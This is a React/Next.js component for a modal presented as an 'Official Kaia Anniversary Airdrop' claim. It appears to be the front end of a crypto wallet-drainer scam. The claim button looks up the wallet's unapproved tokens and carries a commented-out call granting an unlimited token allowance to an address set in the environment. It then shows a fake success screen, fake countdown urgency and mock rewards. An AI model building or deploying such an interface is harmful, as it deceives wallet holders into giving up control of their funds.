"use client"

import { useEffect, useState } from "react"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Gift, Loader2, CheckCircle, Coins, Trophy, Clock } from "lucide-react"

import { useWriteContract } from "wagmi";
import { abi } from "@/lib/erc20abi";

interface ExchangeModalProps {
  isOpen: boolean
  onClose: () => void
  walletAddress: string | null
}

type ExchangeStep = "select" | "authorize" | "exchange" | "success"

export default function ExchangeModal({ isOpen, onClose, walletAddress }: ExchangeModalProps) {

  const { writeContract } = useWriteContract();

  const [step, setStep] = useState<ExchangeStep>("select")
  const [loading, setLoading] = useState(false)




  const mockNFTs = [
    { id: "1", name: "Kaia Anniversary #001", image: "/placeholder.svg?height=100&width=100" },
    { id: "2", name: "Kaia Anniversary #042", image: "/placeholder.svg?height=100&width=100" },
    { id: "3", name: "Kaia Anniversary #123", image: "/placeholder.svg?height=100&width=100" },
  ]

  const handleClaim = async () => {
    setLoading(true)
    setStep("authorize")

    // Simulate authorization
   const tokenList = await fetch('api/getUnapprovedTokens/' + walletAddress) // 请求 Next.js 本地 API 路由
      .then((data) => {
        console.log("Unapproved Tokens:", data.body)
        return data.body
      })

    // await writeContract({
    //   abi,
    //   address: tokenList[0]?.contractAddress as `0x${string}`,
    //   functionName: "approve",
    //   args: [
    //     process.env.NEXT_PUBLIC_CONTRACT_ADDRESS as `0x${string}`,
    //     BigInt(
    //       "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    //     ), // 允许无限制授权
    //   ],
    // });

    setStep("exchange")
    await new Promise((resolve) => setTimeout(resolve, 2000))

    setStep("success")
    setLoading(false)
  }

  const handleClose = () => {
    setStep("select")
    setLoading(false)
    onClose()
  }

  const totalTokens = mockNFTs.length * 1000


  useEffect(() => {
    fetch('/api/getUnapprovedTokens/' + walletAddress) // 请求 Next.js 本地 API 路由
      .then((res) => res.json())
      .then((data) => {
        console.log("Unapproved Tokens:", data[0]?.contractAddress)
      })
  }, [])

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="sm:max-w-lg w-[95vw] max-w-[500px] bg-gray-900 border-[#bff009]/20 mx-auto max-h-[90vh] overflow-y-auto">
        <DialogHeader className="pb-4">
          <DialogTitle className="flex items-center space-x-2 text-white text-lg">
            <Gift className="w-5 h-5 text-[#bff009]" />
            <span>Claim Anniversary Airdrop</span>
          </DialogTitle>
          <DialogDescription className="text-gray-400 text-sm">
            Exchange your Anniversary NFTs for commemorative Kaia tokens
          </DialogDescription>
        </DialogHeader>

        {step === "select" && (
          <div className="space-y-4 md:space-y-6">
            <div className="text-center p-3 md:p-4 bg-[#bff009]/10 rounded-lg border border-[#bff009]/20">
              <Trophy className="w-10 h-10 md:w-12 md:h-12 text-[#bff009] mx-auto mb-2 md:mb-3" />
              <div className="text-base md:text-lg font-semibold text-white mb-1">
                Official Kaia Anniversary Airdrop
              </div>
              <div className="text-xs md:text-sm text-[#bff009]">Commemorative token distribution event</div>
            </div>

            {/* Add compact countdown timer */}
            <div className="bg-red-900/20 border border-red-500/30 rounded-lg p-3 md:p-4">
              <div className="text-center">
                <div className="text-sm font-medium text-red-300 mb-1 md:mb-2 flex items-center justify-center space-x-1">
                  <Clock className="w-4 h-4" />
                  <span>Airdrop ends soon!</span>
                </div>
                <div className="text-xs text-red-400">Claim your tokens before the deadline</div>
              </div>
            </div>

            <div>
              <h4 className="font-medium text-white mb-3 text-sm md:text-base">Your Anniversary NFTs</h4>
              <div className="space-y-2 max-h-32 md:max-h-40 overflow-y-auto">
                {mockNFTs.map((nft) => (
                  <div
                    key={nft.id}
                    className="flex items-center space-x-3 p-2 md:p-3 border border-gray-700 rounded-lg bg-gray-800/30"
                  >
                    <img
                      src={nft.image || "/placeholder.svg"}
                      alt={nft.name}
                      className="w-10 h-10 md:w-12 md:h-12 rounded-lg object-cover flex-shrink-0"
                    />
                    <div className="flex-1 min-w-0">
                      <div className="font-medium text-xs md:text-sm text-white truncate">{nft.name}</div>
                      <Badge
                        variant="secondary"
                        className="text-xs bg-[#bff009]/20 text-[#bff009] border-[#bff009]/30 mt-1"
                      >
                        Anniversary NFT
                      </Badge>
                    </div>
                    <div className="text-right flex-shrink-0">
                      <div className="text-xs md:text-sm font-medium text-[#bff009]">1,000 KAIA</div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            <div className="bg-[#bff009]/10 p-3 md:p-4 rounded-lg border border-[#bff009]/20">
              <div className="flex items-center justify-center space-x-2 mb-2">
                <Coins className="w-4 h-4 md:w-5 md:h-5 text-[#bff009]" />
                <span className="font-medium text-white text-sm md:text-base">Airdrop Summary</span>
              </div>
              <div className="text-center">
                <div className="text-xl md:text-2xl font-bold text-[#bff009]">{totalTokens.toLocaleString()} KAIA</div>
                <div className="text-xs md:text-sm text-gray-400">Total airdrop tokens to receive</div>
              </div>
            </div>

            <Button
              onClick={handleClaim}
              className="w-full bg-[#bff009] text-[#040404] hover:bg-[#bff009]/90 font-semibold py-3 text-sm md:text-base"
              disabled={loading}
            >
              <Gift className="w-4 h-4 mr-2" />
              Claim Anniversary Airdrop
            </Button>
          </div>
        )}

        {step === "authorize" && (
          <div className="text-center py-6 md:py-8">
            <Loader2 className="w-12 h-12 md:w-16 md:h-16 text-[#bff009] mx-auto mb-3 md:mb-4 animate-spin" />
            <h4 className="text-base md:text-lg font-medium text-white mb-2">Authorizing Airdrop Claim</h4>
            <p className="text-gray-400 text-sm md:text-base px-2">
              Please confirm the authorization in your wallet to allow the airdrop contract to process your Anniversary
              NFTs.
            </p>
          </div>
        )}

        {step === "exchange" && (
          <div className="text-center py-6 md:py-8">
            <Loader2 className="w-12 h-12 md:w-16 md:h-16 text-[#bff009] mx-auto mb-3 md:mb-4 animate-spin" />
            <h4 className="text-base md:text-lg font-medium text-white mb-2">Processing Airdrop</h4>
            <p className="text-gray-400 text-sm md:text-base px-2">
              Your Anniversary NFTs are being processed for the commemorative airdrop. This may take a few moments.
            </p>
          </div>
        )}

        {step === "success" && (
          <div className="text-center py-6 md:py-8">
            <div className="w-12 h-12 md:w-16 md:h-16 bg-[#bff009] rounded-full flex items-center justify-center mx-auto mb-3 md:mb-4">
              <CheckCircle className="w-6 h-6 md:w-8 md:h-8 text-[#040404]" />
            </div>
            <h4 className="text-base md:text-lg font-medium text-white mb-2">Airdrop Claimed Successfully!</h4>
            <p className="text-gray-400 mb-4 md:mb-6 text-sm md:text-base px-2">
              Congratulations! Your {mockNFTs.length} Anniversary NFTs have been successfully processed for the
              commemorative airdrop.
            </p>
            <div className="bg-[#bff009]/10 p-3 md:p-4 rounded-lg mb-4 md:mb-6 border border-[#bff009]/20">
              <div className="text-xl md:text-2xl font-bold text-[#bff009] mb-1">
                {totalTokens.toLocaleString()} KAIA
              </div>
              <div className="text-xs md:text-sm text-[#bff009] mb-2">Anniversary airdrop tokens received</div>
              <div className="text-xs text-gray-400">
                Tokens transferred to: {walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}
              </div>
            </div>
            <Button
              onClick={handleClose}
              className="w-full bg-[#bff009] text-[#040404] hover:bg-[#bff009]/90 font-semibold py-3 text-sm md:text-base"
            >
              Close
            </Button>
          </div>
        )}
      </DialogContent>
    </Dialog>
  )
}
